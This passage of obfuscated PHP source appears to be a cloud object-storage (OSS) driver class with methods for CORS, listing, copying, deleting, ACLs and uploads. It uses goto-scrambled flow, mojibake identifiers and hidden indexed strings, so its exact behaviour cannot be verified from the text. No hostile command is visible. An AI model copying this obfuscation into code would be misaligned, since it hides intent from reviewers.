getBucketCors() { goto dîÉ¨úö¡€; dîÉ¨úö¡€: $cç≈·´Ï∏Ÿ =& $_SERVER[ú∫]; $cÉ◊Ωåê›æ = null; try { $cÉ◊Ωåê›æ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $dıàßÔçÈÓ) { return null; } goto fà‘ä≠¯≠ì; fà‘ä≠¯≠ì: if (!$cÉ◊Ωåê›æ || !($c√ÊÍ•çΩå = $cÉ◊Ωåê›æ->getRules())) { return null; } $CÆ’õΩ∂≤™ = $c√ÊÍ•çΩå[0]->getAllowedOrigins(); $BæŒ®ü°æ˘ = $c√ÊÍ•çΩå[0]->getAllowedMethods(); goto bÊãâ·Œçﬁ; d◊èÊ»ΩÖÕ: return array($cç≈·´Ï∏Ÿ[181] => isset($CÆ’õΩ∂≤™[0]) ? $CÆ’õΩ∂≤™[0] : $cç≈·´Ï∏Ÿ[33], $cç≈·´Ï∏Ÿ[185] => $BæŒ®ü°æ˘, $cç≈·´Ï∏Ÿ[1269] => $aÀç¨Ω„ÎΩ, $cç≈·´Ï∏Ÿ[1270] => isset($cåŸè¶≠›œ[0]) ? $cåŸè¶≠›œ[0] : $cç≈·´Ï∏Ÿ[33], $cç≈·´Ï∏Ÿ[183] => isset($E©á∆»Ñ•õ[0]) ? $E©á∆»Ñ•õ[0] : $cç≈·´Ï∏Ÿ[33]); goto Fúâõ¬±ﬂÍ; bÊãâ·Œçﬁ: $aÀç¨Ω„ÎΩ = $c√ÊÍ•çΩå[0]->getMaxAgeSeconds(); $cåŸè¶≠›œ = $c√ÊÍ•çΩå[0]->getExposeHeaders(); $E©á∆»Ñ•õ = $c√ÊÍ•çΩå[0]->getAllowedHeaders(); goto d◊èÊ»ΩÖÕ; Fúâõ¬±ﬂÍ: } public function isBucketCors() { goto AôÍÖ…ìÍÃ; AôÍÖ…ìÍÃ: $cÇ∂Ô˜• ≠ =& $_SERVER[ú∫]; $d«•’·ƒ’† = $this->getBucketCors(); if (!$d«•’·ƒ’† || !is_array($d«•’·ƒ’†)) { return !1; } goto a¬‹∂Ùá≥’; EÂ∏‚æ∆∫√: $Eö”ç∑˘¥« = array($cÇ∂Ô˜• ≠[186], $cÇ∂Ô˜• ≠[187], $cÇ∂Ô˜• ≠[188], $cÇ∂Ô˜• ≠[189], $cÇ∂Ô˜• ≠[190]); $EéÔ∞ƒŸ¢Õ = array_diff($Eö”ç∑˘¥«, $aÍÖ†ÈƒÀÏ); return empty($EéÔ∞ƒŸ¢Õ); goto DùÜ˘⁄ΩìÜ; a¬‹∂Ùá≥’: if ($d«•’·ƒ’†[$cÇ∂Ô˜• ≠[181]] != $cÇ∂Ô˜• ≠[182] || $d«•’·ƒ’†[$cÇ∂Ô˜• ≠[183]] != $cÇ∂Ô˜• ≠[182]) { return !1; } $aÍÖ†ÈƒÀÏ = array_map($cÇ∂Ô˜• ≠[184], $d«•’·ƒ’†[$cÇ∂Ô˜• ≠[185]]); if (!is_array($aÍÖ†ÈƒÀÏ)) { $aÍÖ†ÈƒÀÏ = array(); } goto EÂ∏‚æ∆∫√; DùÜ˘⁄ΩìÜ: } public function mkfile($F˜àç’‹ å, $eÆºΩª«–ü = '', $AØ«∫∞óàŸ = REPEAT_RENAME) { $Dµ ’πØûë = $this->setContent($F˜àç’‹ å, $eÆºΩª«–ü); if ($Dµ ’πØûë !== !1) { return $this->getPathOuter($F˜àç’‹ å); } return !1; } public function mkdir($DÉòåì¬ß, $d‡ﬁŒà√ûù = REPEAT_SKIP) { if ($this->_isFolder($DÉòåì¬ß)) { return $this->getPathOuter($DÉòåì¬ß); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($DÉòåì¬ß)); } catch (OSS\Core\OssException $aå›õÿπÕ“) { return !1; } return $this->getPathOuter($DÉòåì¬ß); } private function fileList($DÓåáêôëö, $e≠“¥⁄äÑ¿ = '', $f∏¡çØÈäº = 0) { goto a‘íË®⁄çç; bÂ °õ©„÷: $B¶ï¯Í˘Úª = $C∆Æ‘≈Ì⁄‰[33]; $AÒíÌ≤ò“ = 1000; $FÕ»†÷ö•∞ = $this->listItemCache === !1 ? !1 : !0; goto aê–ÖÜ§á≤; a‘íË®⁄çç: $C∆Æ‘≈Ì⁄‰ =& $_SERVER[ú∫]; $DÓåáêôëö = trim($DÓåáêôëö, $C∆Æ‘≈Ì⁄‰[8]); $D—£õ‹ÃÿÏ = empty($DÓåáêôëö) && $DÓåáêôëö !== $C∆Æ‘≈Ì⁄‰[191] ? $C∆Æ‘≈Ì⁄‰[33] : $DÓåáêôëö . $C∆Æ‘≈Ì⁄‰[8]; goto bÂ °õ©„÷; FõππÈù≠õ: return array($C∆Æ‘≈Ì⁄‰[75] => $CâÿÁÏ¯‡∏, $C∆Æ‘≈Ì⁄‰[74] => $Cæªˆø≤’≠); goto B–Ñ˘òã˘Æ; aê–ÖÜ§á≤: $CâÿÁÏ¯‡∏ = $Cæªˆø≤’≠ = array(); while (!0) { check_abort(); $Bö—øı÷Ìå = array($C∆Æ‘≈Ì⁄‰[1271] => $e≠“¥⁄äÑ¿, $C∆Æ‘≈Ì⁄‰[1272] => $D—£õ‹ÃÿÏ, $C∆Æ‘≈Ì⁄‰[1273] => $AÒíÌ≤ò“, $C∆Æ‘≈Ì⁄‰[1274] => $B¶ï¯Í˘Úª); try { $d¯ΩÓÚéìù = $this->client->listObjects($this->bucket, $Bö—øı÷Ìå); } catch (OSS\Core\OssException $BÚø´ñ£Ù˜) { break; } $B¶ï¯Í˘Úª = $d¯ΩÓÚéìù->getNextMarker(); $CÌÇÙ√óäË = $d¯ΩÓÚéìù->getObjectList(); $F≠˜Öé¥á‰ = $d¯ΩÓÚéìù->getPrefixList(); foreach ($CÌÇÙ√óäË as $aúßËì¥›˜) { goto FÍó‰§ï¿£; aÎë°≠ﬁÃ: if ($FÕ»†÷ö•∞) { $this->cacheMethod($C∆Æ‘≈Ì⁄‰[199], $Dø·ë—≠áó, $DÖÆÀÛæΩæ); $this->cacheMethod($C∆Æ‘≈Ì⁄‰[200], $Dø·ë—≠áó, array($C∆Æ‘≈Ì⁄‰[78] => $F∫°Âƒπ≥ç, $C∆Æ‘≈Ì⁄‰[1275] => $F∫°Âƒπ≥ç, $C∆Æ‘≈Ì⁄‰[84] => strtotime($F·©‡∞∫’œ), $C∆Æ‘≈Ì⁄‰[1276] => $F·©‡∞∫’œ)); } if ($DÖÆÀÛæΩæ) { $CâÿÁÏ¯‡∏[] = $Dø·ë—≠áó; continue; } $Cæªˆø≤’≠[] = $c„Ÿ±∂ù¬û; goto fıÃÀï¿√ÿ; FÍó‰§ï¿£: if ($aúßËì¥›˜->getKey() == $D—£õ‹ÃÿÏ) { continue; } $Dø·ë—≠áó = $aúßËì¥›˜->getKey(); $F∫°Âƒπ≥ç = $aúßËì¥›˜->getSize(); goto A◊’¿œÜ◊™; A◊’¿œÜ◊™: $F·©‡∞∫’œ = $aúßËì¥›˜->getLastModified(); $c„Ÿ±∂ù¬û = $f∏¡çØÈäº ? array($C∆Æ‘≈Ì⁄‰[28] => $Dø·ë—≠áó, $C∆Æ‘≈Ì⁄‰[78] => $F∫°Âƒπ≥ç, $C∆Æ‘≈Ì⁄‰[197] => strtotime($F·©‡∞∫’œ)) : $Dø·ë—≠áó; $DÖÆÀÛæΩæ = $F∫°Âƒπ≥ç == 0 && substr($Dø·ë—≠áó, strlen($Dø·ë—≠áó) - 1, 1) == $C∆Æ‘≈Ì⁄‰[8] ? !0 : !1; goto aÎë°≠ﬁÃ; fıÃÀï¿√ÿ: } foreach ($F≠˜Öé¥á‰ as $f‡Ÿ∆€´“≥) { $CâÿÁÏ¯‡∏[] = $f‡Ÿ∆€´“≥->getPrefix(); if ($FÕ»†÷ö•∞) { $this->cacheMethod($C∆Æ‘≈Ì⁄‰[199], $Dø·ë—≠áó, !0); } } if ($B¶ï¯Í˘Úª === $C∆Æ‘≈Ì⁄‰[33]) { break; } } if ($FÕ»†÷ö•∞) { $this->cacheMethod($C∆Æ‘≈Ì⁄‰[199], $DÓåáêôëö, !0); } goto FõππÈù≠õ; B–Ñ˘òã˘Æ: } public function copyFile($F‘£≈Ïôäç, $A∑÷Ê∫âàÌ) { $d”»Ç˘⁄√Ë = $this->size($F‘£≈Ïôäç); if ($d”»Ç˘⁄√Ë < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $F‘£≈Ïôäç, $this->bucket, $this->pathEncode($A∑÷Ê∫âàÌ)); } catch (OSS\Core\OssException $a—Ñ“Œê˘á) { return !1; } return $this->getPathOuter($A∑÷Ê∫âàÌ); } $eñãçó©π« = $this->multiCopyObject($F‘£≈Ïôäç, $A∑÷Ê∫âàÌ, $d”»Ç˘⁄√Ë); return $eñãçó©π« ? $this->getPathOuter($A∑÷Ê∫âàÌ) : !1; } private function multiCopyObject($BÕôûÑÃ”œ, $dΩ°Ìöﬂ”Ù, $cÁËÙƒÊã) { $aúèÎﬁÃÆü =& $_SERVER[ú∫]; try { goto dàö´ª‚©‹; D÷Œì“⁄ƒ”: $a£‹›ƒ≈‹» = array(); foreach ($Fò¶Í“Æﬁá as $B◊¶øﬂãÖª => $aÿ◊™Ò“Ÿﬂ) { $a£‹›ƒ≈‹»[] = array($aúèÎﬁÃÆü[1281] => $B◊¶øﬂãÖª + 1, $aúèÎﬁÃÆü[1282] => $aÿ◊™Ò“Ÿﬂ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($dΩ°Ìöﬂ”Ù), $f®ñè…Ø•¨, $a£‹›ƒ≈‹»); goto e±œ®‘—ΩÔ; fÚÌñØàüÁ: $e°™ìÜñıı = 1; $d¬ê«“ºÑ€ = 0; $Fò¶Í“Æﬁá = array(); goto F˜ÎœÂ¿°æ; F˜ÎœÂ¿°æ: $Bà¡‘€¬â… = 1024 * 1024 * 10; $bãâªœöƒÍ = $this->client->generateMultiuploadParts($cÁËÙƒÊã, $Bà¡‘€¬â…); foreach ($bãâªœöƒÍ as $B◊¶øﬂãÖª => $fÙñëÏ∫œ≤) { $BŒ≥æÁÊì† = $d¬ê«“ºÑ€ + (int) $fÙñëÏ∫œ≤[$aúèÎﬁÃÆü[1278]]; $cê¿ÿ∂È  = (int) $fÙñëÏ∫œ≤[$aúèÎﬁÃÆü[335]] + $BŒ≥æÁÊì† - 1; $fÉØ÷Öüâπ = array($aúèÎﬁÃÆü[1279] => $BŒ≥æÁÊì†, $aúèÎﬁÃÆü[1280] => $cê¿ÿ∂È ); $Fò¶Í“Æﬁá[] = $this->client->uploadPartCopy($this->bucket, $BÕôûÑÃ”œ, $this->bucket, $this->pathEncode($dΩ°Ìöﬂ”Ù), $e°™ìÜñıı, $f®ñè…Ø•¨, $fÉØ÷Öüâπ); $e°™ìÜñıı = $e°™ìÜñıı + 1; } goto D÷Œì“⁄ƒ”; dàö´ª‚©‹: $eààÑ°æÕ· = array(); if ($eº±Îâıäª = $this->hashMd5($BÕôûÑÃ”œ)) { $eààÑ°æÕ· = array(OSS\OssClient::OSS_HEADERS => array($aúèÎﬁÃÆü[1277] => $eº±Îâıäª)); } $f®ñè…Ø•¨ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($dΩ°Ìöﬂ”Ù), $eààÑ°æÕ·); goto fÚÌñØàüÁ; e±œ®‘—ΩÔ: } catch (OSS\Core\OssException $CÇèà≠œ€Ö) { return !1; } return !0; } public function moveFile($aùëÜŒ®ï∞, $C›èîÙåóæ) { if ($this->copyFile($aùëÜŒ®ï∞, $C›èîÙåóæ)) { $this->remove($aùëÜŒ®ï∞); return $this->getPathOuter($C›èîÙåóæ); } return !1; } public function delFile($dã⁄«ë°«Ì) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($dã⁄«ë°«Ì)); } catch (OSS\Core\OssException $aù≠ÔÆíÏ‡) { return !1; } return !0; } public function delFolder($BÆ¢ãı∞¡Û) { goto aáÂ÷ÿ—•Ÿ; aáÂ÷ÿ—•Ÿ: $C±ΩêìÂàö =& $_SERVER[ú∫]; if (!$this->exist($BÆ¢ãı∞¡Û)) { return !0; } $this->listItemCache = !1; goto fî¿ÍéŸúÔ; fî¿ÍéŸúÔ: $E¨Â–‚Á í = $this->fileList($BÆ¢ãı∞¡Û); $this->listItemCache = !0; $fï˜è—¯Ùº = trim($BÆ¢ãı∞¡Û, $C±ΩêìÂàö[8]) . $C±ΩêìÂàö[8]; goto DÈ¿¿ËÔÆÖ; DÈ¿¿ËÔÆÖ: if (!empty($BÆ¢ãı∞¡Û) && $BÆ¢ãı∞¡Û !== $C±ΩêìÂàö[191] && !in_array($fï˜è—¯Ùº, $E¨Â–‚Á í[$C±ΩêìÂàö[75]])) { $E¨Â–‚Á í[$C±ΩêìÂàö[75]][] = $fï˜è—¯Ùº; } $Fµû÷¿ûÖë = $this->delByBatch($E¨Â–‚Á í[$C±ΩêìÂàö[74]]); if (!$Fµû÷¿ûÖë) { return !1; } goto eµÑç«≤ˆ¡; eµÑç«≤ˆ¡: $Fµû÷¿ûÖë = $this->delByBatch($E¨Â–‚Á í[$C±ΩêìÂàö[75]]); if (!$Fµû÷¿ûÖë) { return !1; } return $this->delFile($fï˜è—¯Ùº); goto fÊ∆•ÜîÍò; fÊ∆•ÜîÍò: } private function delByBatch($B•ÚõÔÒœ) { foreach (array_chunk($B•ÚõÔÒœ, 1000) as $a¶çÕßåÌÀ) { try { $this->client->deleteObjects($this->bucket, $a¶çÕßåÌÀ); } catch (OSS\Core\OssException $F«€˜¥Ó•˜) { return !1; } } return !0; } public function rename($fÍ±ÓÓø‚™, $E–”›ãıæò) { return $this->renameObject($fÍ±ÓÓø‚™, $E–”›ãıæò); } private function fileInfo($CﬂçÖïÍ¶≠, $F¯Œ∫Ö£ ó = false, $F∑µÚñÍÌÊ = array()) { goto cÌﬂﬁ‰òÓÒ; b¢·êÜ˜Ê¡: if (isset($F∑µÚñÍÌÊ[$fòâïõ ÁÀ[78]])) { $Eî‚öÇ€®≤[$fòâïõ ÁÀ[78]] = $F∑µÚñÍÌÊ[$fòâïõ ÁÀ[78]]; } if (isset($F∑µÚñÍÌÊ[$fòâïõ ÁÀ[84]])) { $Eî‚öÇ€®≤[$fòâïõ ÁÀ[84]] = $F∑µÚñÍÌÊ[$fòâïõ ÁÀ[84]]; } if (isset($F∑µÚñÍÌÊ[$fòâïõ ÁÀ[197]]) && !trim($Eî‚öÇ€®≤[$fòâïõ ÁÀ[84]])) { $Eî‚öÇ€®≤[$fòâïõ ÁÀ[84]] = $F∑µÚñÍÌÊ[$fòâïõ ÁÀ[197]]; } goto B¢–¶–…µà; B¢–¶–…µà: return $Eî‚öÇ€®≤; goto dÊê¥Âˆßº; DƒÜêÒÛêê: $Eî‚öÇ€®≤[$fòâïõ ÁÀ[194]] = $Eî‚öÇ€®≤[$fòâïõ ÁÀ[84]] = 0; $Eî‚öÇ€®≤[$fòâïõ ÁÀ[195]] = $Eî‚öÇ€®≤[$fòâïõ ÁÀ[196]] = !0; if (empty($F∑µÚñÍÌÊ)) { $Cåçî„÷©› = $this->objectMeta($CﬂçÖïÍ¶≠); if (!$Cåçî„÷©›) { return $Eî‚öÇ€®≤; } $F∑µÚñÍÌÊ = array($fòâïõ ÁÀ[84] => strtotime($Cåçî„÷©›[$fòâïõ ÁÀ[1276]]), $fòâïõ ÁÀ[78] => $Cåçî„÷©›[$fòâïõ ÁÀ[1275]] + 0); } goto b¢·êÜ˜Ê¡; cÌﬂﬁ‰òÓÒ: $fòâïõ ÁÀ =& $_SERVER[ú∫]; $Eî‚öÇ€®≤ = array($fòâïõ ÁÀ[28] => $this->pathThis($CﬂçÖïÍ¶≠), $fòâïõ ÁÀ[76] => $this->getPathOuter($CﬂçÖïÍ¶≠), $fòâïõ ÁÀ[29] => $fòâïõ ÁÀ[193], $fòâïõ ÁÀ[78] => isset($F∑µÚñÍÌÊ[$fòâïõ ÁÀ[78]]) ? $F∑µÚñÍÌÊ[$fòâïõ ÁÀ[78]] : 0, $fòâïõ ÁÀ[168] => $this->ext($CﬂçÖïÍ¶≠)); if ($F¯Œ∫Ö£ ó) { return $Eî‚öÇ€®≤; } goto DƒÜêÒÛêê; dÊê¥Âˆßº: } private function folderInfo($e¡√ù∑æŒú, $Bø≠—¿∆≈‡ = false, $d‰ÂâùéÏ≈ = array()) { goto aÍÃŒ‹ïÈÀ; aÍÃŒ‹ïÈÀ: $Bç≈ö≠∑◊à =& $_SERVER[ú∫]; $eöôºÇÜπë = array($Bç≈ö≠∑◊à[28] => $this->pathThis($e¡√ù∑æŒú), $Bç≈ö≠∑◊à[76] => $this->getPathOuter($Bç≈ö≠∑◊à[8] . $e¡√ù∑æŒú), $Bç≈ö≠∑◊à[29] => $Bç≈ö≠∑◊à[77]); if ($Bø≠—¿∆≈‡) { return $eöôºÇÜπë; } goto A…ŒΩÔ›ã§; d∑«áıö∆ø: if (isset($d‰ÂâùéÏ≈[$Bç≈ö≠∑◊à[84]])) { $eöôºÇÜπë[$Bç≈ö≠∑◊à[84]] = $d‰ÂâùéÏ≈[$Bç≈ö≠∑◊à[84]]; } if (isset($d‰ÂâùéÏ≈[$Bç≈ö≠∑◊à[194]])) { $eöôºÇÜπë[$Bç≈ö≠∑◊à[194]] = $d‰ÂâùéÏ≈[$Bç≈ö≠∑◊à[194]]; } return $eöôºÇÜπë; goto cåãùÈº©–; A…ŒΩÔ›ã§: $eöôºÇÜπë[$Bç≈ö≠∑◊à[194]] = $eöôºÇÜπë[$Bç≈ö≠∑◊à[84]] = 0; $eöôºÇÜπë[$Bç≈ö≠∑◊à[195]] = $eöôºÇÜπë[$Bç≈ö≠∑◊à[196]] = !0; if (empty($d‰ÂâùéÏ≈)) { $e¡√ù∑æŒú = rtrim($e¡√ù∑æŒú, $Bç≈ö≠∑◊à[8]) . $Bç≈ö≠∑◊à[8]; $Eˆ⁄¶Ù§›† = $this->objectMeta($e¡√ù∑æŒú); if (!$Eˆ⁄¶Ù§›†) { return $eöôºÇÜπë; } $d‰ÂâùéÏ≈ = array($Bç≈ö≠∑◊à[194] => $Eˆ⁄¶Ù§›†[$Bç≈ö≠∑◊à[1283]][$Bç≈ö≠∑◊à[1284]], $Bç≈ö≠∑◊à[84] => strtotime($Eˆ⁄¶Ù§›†[$Bç≈ö≠∑◊à[1276]])); } goto d∑«áıö∆ø; cåãùÈº©–: } public function listPath($F¬ÕΩ∏£úå, $C∞ÔÑÉ¡∂ó = false) { $F“˘√Òﬁó∆ =& $_SERVER[ú∫]; $EÑÓπê≠Õ∂ = $this->fileList($F¬ÕΩ∏£úå, $F“˘√Òﬁó∆[8], !0); foreach ($EÑÓπê≠Õ∂[$F“˘√Òﬁó∆[75]] as $a¥™‡Ò∫ä… => $E…Í·ªÏŸ‹) { $EÑÓπê≠Õ∂[$F“˘√Òﬁó∆[75]][$a¥™‡Ò∫ä…] = $this->folderInfo($E…Í·ªÏŸ‹, $C∞ÔÑÉ¡∂ó, $E…Í·ªÏŸ‹); } foreach ($EÑÓπê≠Õ∂[$F“˘√Òﬁó∆[74]] as $a¥™‡Ò∫ä… => $E…Í·ªÏŸ‹) { $EÑÓπê≠Õ∂[$F“˘√Òﬁó∆[74]][$a¥™‡Ò∫ä…] = $this->fileInfo($E…Í·ªÏŸ‹[$F“˘√Òﬁó∆[28]], $C∞ÔÑÉ¡∂ó, $E…Í·ªÏŸ‹); } return $EÑÓπê≠Õ∂; } public function has($b≤ôπõË¬µ, $CòÉ∂¨ò≥É = false, $e°¡Ñíã´Ë = true) { goto fõÉéœŸ≠¶; fõÉéœŸ≠¶: $eÑåØá•ßÕ =& $_SERVER[ú∫]; $b≤ôπõË¬µ = trim($b≤ôπõË¬µ, $eÑåØá•ßÕ[8]); $a‹◊í˜°™‰ = empty($b≤ôπõË¬µ) && $b≤ôπõË¬µ !== $eÑåØá•ßÕ[191] ? $eÑåØá•ßÕ[33] : $b≤ôπõË¬µ . $eÑåØá•ßÕ[8]; goto F÷õ∞§âÔ‚; C£∆∞‹ã®è: while (!0) { check_abort(); $f†–∫Ò≤≥Ë = array($eÑåØá•ßÕ[1271] => $eÑåØá•ßÕ[8], $eÑåØá•ßÕ[1272] => $a‹◊í˜°™‰, $eÑåØá•ßÕ[1273] => $a∑∂≠∂ﬁõ†, $eÑåØá•ßÕ[1274] => $dë…¿∏Æıû); try { $dâ’Ê•©¨ô = $this->client->listObjects($this->bucket, $f†–∫Ò≤≥Ë); } catch (OSS\Core\OssException $dâì¿ÒÔÒÃ) { break; } $dë…¿∏Æıû = $dâ’Ê•©¨ô->getNextMarker(); $e—Ç¢‡êãÛ = $dâ’Ê•©¨ô->getObjectList(); $A°ïéÎ§á = $dâ’Ê•©¨ô->getPrefixList(); if ($CòÉ∂¨ò≥É) { if (count($e—Ç¢‡êãÛ) > 1 || count($e—Ç¢‡êãÛ) == 1 && $e—Ç¢‡êãÛ[0]->getKey() != $a‹◊í˜°™‰) { $fÜÔ†ôá≠® += count($e—Ç¢‡êãÛ) - 1; } if (!empty($A°ïéÎ§á)) { $FÖàÀì¬™Ç += count($A°ïéÎ§á); } if ($dë…¿∏Æıû === $eÑåØá•ßÕ[33]) { break; } continue; } if ($e°¡Ñíã´Ë) { if (!empty($e—Ç¢‡êãÛ)) { if (count($e—Ç¢‡êãÛ) > 1 || $e—Ç¢‡êãÛ[0]->getKey() != $a‹◊í˜°™‰) { return !0; } } } else { if (!empty($A°ïéÎ§á)) { return !0; } } if ($dë…¿∏Æıû === $eÑåØá•ßÕ[33]) { break; } } if ($CòÉ∂¨ò≥É) { return array($eÑåØá•ßÕ[203] => $fÜÔ†ôá≠®, $eÑåØá•ßÕ[204] => $FÖàÀì¬™Ç); } return !1; goto d”Ãô¢¨œ¡; F÷õ∞§âÔ‚: $dë…¿∏Æıû = $eÑåØá•ßÕ[33]; $a∑∂≠∂ﬁõ† = 500; $fÜÔ†ôá≠® = $FÖàÀì¬™Ç = 0; goto C£∆∞‹ã®è; d”Ãô¢¨œ¡: } public function listAll($fÑÂÿ∂€á›) { $Aã¢ÁÑáé… =& $_SERVER[ú∫]; $cƒõÁΩòã∏ = $this->fileList($fÑÂÿ∂€á›, $Aã¢ÁÑáé…[33], !0); $aßÜ¿Ï´⁄Ã = array(); foreach ($cƒõÁΩòã∏[$Aã¢ÁÑáé…[74]] as $fÈòããÖ•∞) { $aßÜ¿Ï´⁄Ã[$fÈòããÖ•∞[$Aã¢ÁÑáé…[28]]] = $fÈòããÖ•∞[$Aã¢ÁÑáé…[78]]; } foreach ($cƒõÁΩòã∏[$Aã¢ÁÑáé…[75]] as $fÈòããÖ•∞) { if (is_string($fÈòããÖ•∞)) { $aßÜ¿Ï´⁄Ã[$fÈòããÖ•∞] = 0; } } return $this->listAllFiles($fÑÂÿ∂€á›, array_keys($aßÜ¿Ï´⁄Ã), $aßÜ¿Ï´⁄Ã); } public function canRead($B√€∂Ωˆ•ˆ) { $bÏ†¯±“Áø =& $_SERVER[ú∫]; $DΩç”⁄®µË = $this->pathAcl($B√€∂Ωˆ•ˆ); return $DΩç”⁄®µË == $bÏ†¯±“Áø[1285] || $DΩç”⁄®µË == $bÏ†¯±“Áø[519] ? !0 : !1; } public function canWrite($AÈç§ñÏÒƒ) { $aÇŒ¿´ èØ = $this->pathAcl($AÈç§ñÏÒƒ); return $aÇŒ¿´ èØ == $_SERVER[ú∫][519] ? !0 : !1; } public function pathAcl($aœπå¶ñë£) { goto b›‹ŸÕäµ°; b›‹ŸÕäµ°: $AˆÇ»æÿ‰Ì =& $_SERVER[ú∫]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $a¥§¡…ÿÑ† = $this->client->getObjectAcl($this->bucket, $this->pathEncode($aœπå¶ñë£)); } catch (OSS\Core\OssException $A¡ÒÑ–÷ºö) { return !1; } goto bˆ—ÕÊíÂ◊; bˆ—ÕÊíÂ◊: $d√®É¯˘æƒ = $a¥§¡…ÿÑ† == $AˆÇ»æÿ‰Ì[34] ? $this->bucketAcl : $a¥§¡…ÿÑ†; if ($d√®É¯˘æƒ == $AˆÇ»æÿ‰Ì[1286]) { return $AˆÇ»æÿ‰Ì[1285]; } if ($d√®É¯˘æƒ == $AˆÇ»æÿ‰Ì[1287]) { return $AˆÇ»æÿ‰Ì[519]; } goto e±æÂ∑ÿÑﬂ; e±æÂ∑ÿÑﬂ: return $d√®É¯˘æƒ; goto aÁÑøÌ≠çö; aÁÑøÌ≠çö: } private function chmodPath($D™≥œ¨üì£, $F≥Ë™éçÉÁ = '') { $e‡‹≈ﬁÓµ‹ =& $_SERVER[ú∫]; $fÚß≥È™Ùü = empty($F≥Ë™éçÉÁ) ? $e‡‹≈ﬁÓµ‹[1287] : $F≥Ë™éçÉÁ; $Aîÿ≈ﬂêª≤ = array($e‡‹≈ﬁÓµ‹[34], $e‡‹≈ﬁÓµ‹[192], $e‡‹≈ﬁÓµ‹[1286], $e‡‹≈ﬁÓµ‹[1287]); if (!in_array($fÚß≥È™Ùü, $Aîÿ≈ﬂêª≤)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($D™≥œ¨üì£), $fÚß≥È™Ùü); } catch (OSS\Core\OssException $EœÊ≠ÒÖàø) { return !1; } return !0; } public function getContent($EÌá¿û◊«∂) { return $this->fileSubstr($EÌá¿û◊«∂, -1); } public function setContent($eœﬁóﬂ»Èß, $d™ÇÖ¡ëåñ = '') { $FÈπß„¥≥£ =& $_SERVER[ú∫]; try { $A€õçÖÙ«∑ = $this->trafficLimit($FÈπß„¥≥£[1288]); $bôàëïãÖ˘ = $this->client->putObject($this->bucket, $this->pathEncode($eœﬁóﬂ»Èß), $d™ÇÖ¡ëåñ, $A€õçÖÙ«∑); } catch (OSS\Core\OssException $eÕ°ÎúÏ√ã) { return !1; } $bﬁ€íˆË‡∏ = array($FÈπß„¥≥£[1277] => trim($bôàëïãÖ˘[$FÈπß„¥≥£[1289]], $FÈπß„¥≥£[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($eœﬁóﬂ»Èß))); $this->updateObjMeta($eœﬁóﬂ»Èß, $bﬁ€íˆË‡∏); return isset($bôàëïãÖ˘[$FÈπß„¥≥£[1290]][$FÈπß„¥≥£[1236]]) ? !0 : !1; } private function updateObjMeta($Aãè≠Ó•¬‘, $F›ëó–ÙÇç) { $Aãè≠Ó•¬‘ = $this->pathEncode($Aãè≠Ó•¬‘); try { $dìÔ•πàËﬁ = array(OSS\OssClient::OSS_HEADERS => $F›ëó–ÙÇç); $this->client->copyObject($this->bucket, $Aãè≠Ó•¬‘, $this->bucket, $Aãè≠Ó•¬‘, $dìÔ•πàËﬁ); } catch (OSS\Core\OssException $f™äÕÑÊ»±) { return !1; } return !0; } public function upload($cœÉé…∑á˜, $e∂–≤Ú€Ã–, $bêºªú˘Ωè = false, $cííñùà¬… = REPEAT_REPLACE) { $E¥Ò¬£ˆãè =& $_SERVER[ú∫]; $eÜë£≤ß“û = trim($cœÉé…∑á˜, $E¥Ò¬£ˆãè[8]); $DÓÑçﬂÓ„‘ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($E¥Ò¬£ˆãè[1277] => @md5_file($e∂–≤Ú€Ã–)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($cœÉé…∑á˜))); $DÓÑçﬂÓ„‘ = $this->trafficLimit($E¥Ò¬£ˆãè[1288], $DÓÑçﬂÓ„‘); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($eÜë£≤ß“û), $e∂–≤Ú€Ã–, $DÓÑçﬂÓ„‘); } catch (OSS\Core\OssException $dúè‡ô◊∆†) { return !1; } return $this->getPathOuter($cœÉé…∑á˜); } public function getHost() { $BÏóËõÉªé =& $_SERVER[ú∫]; $cä àì›∞› = explode($BÏóËõÉªé[177], parent::getHost()); return $cä àì›∞›[0] . $BÏóËõÉªé[177] . $this->bucket . $BÏóËõÉªé[95] . $cä àì›∞›[1]; } public function uploadFormData($Bµ√ËîÎ∂÷, $fã±á±¬Á‡ = 3600) { goto A¿⁄ñ≥ÜéÖ; D¬Öñß˘ÒØ: $dﬂµÿ∏µ∆Ù = strpos($d¨Ñøëàµ, $A„îî‡ïÁ∑[294]); $d¨Ñøëàµ = substr($d¨Ñøëàµ, 0, $dﬂµÿ∏µ∆Ù) . $A„îî‡ïÁ∑[1292]; $CÌÏﬂ‘Ü¿É = 1048576000 * 5; goto EŒ©ÿÑ ƒÉ; AÊ•ìƒÜÿé: $A∆àã⁄ä±É = date($A„îî‡ïÁ∑[1291], time() + $b≥ÛÌÜÚÏ∫); $D›≈–ªÆª’ = new DateTime($A∆àã⁄ä±É); $d¨Ñøëàµ = $D›≈–ªÆª’->format(DateTime::ISO8601); goto D¬Öñß˘ÒØ; EŒ©ÿÑ ƒÉ: $d¥’Ìâ™–¢ = $this->pathFather($Bµ√ËîÎ∂÷); $aµçí‚”–ì = array($A„îî‡ïÁ∑[1191] => $d¨Ñøëàµ, $A„îî‡ïÁ∑[1192] => array(array($A„îî‡ïÁ∑[1293], 0, $CÌÏﬂ‘Ü¿É), array($A„îî‡ïÁ∑[1195], $A„îî‡ïÁ∑[1196], $d¥’Ìâ™–¢))); $EÂÈ√ø€é¢ = base64_encode(json_encode($aµçí‚”–ì)); goto c€·•¯«Õπ; c€·•¯«Õπ: $Eóπ®¢™Ñ‹ = base64_encode(hash_hmac($A„îî‡ïÁ∑[230], $EÂÈ√ø€é¢, $this->secret, !0)); $E†©Ò„”¥± = array($A„îî‡ïÁ∑[1201] => $EÂÈ√ø€é¢, $A„îî‡ïÁ∑[1294] => 